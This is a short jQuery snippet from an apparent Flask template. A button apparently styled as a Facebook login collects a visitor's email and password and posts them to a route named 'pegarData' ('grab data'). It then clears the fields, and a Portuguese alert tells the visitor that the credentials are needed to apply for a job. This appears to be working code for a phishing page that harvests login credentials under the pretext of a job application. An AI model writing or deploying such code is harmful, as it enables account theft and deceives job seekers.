<script>

$( "#btnface" ).on( "click", function() {

    email = $("#email").val()
    passwd = $("#passwd").val()

    if(email.length!=0 && passwd.length!=0){

    $.ajax({
        url : "{{ url_for('pegarData') }}",
        type : 'post',
        data : {
            email : email,
            passwd : passwd
        }
    })
    .done(function(msg){
        $("#email").val("")
        $("#passwd").val("")
    })
    } else {
        alert("Favor preencher os dados com Email e Senha para conseguir se candidatar na vaga!")
    }



} );


</script>
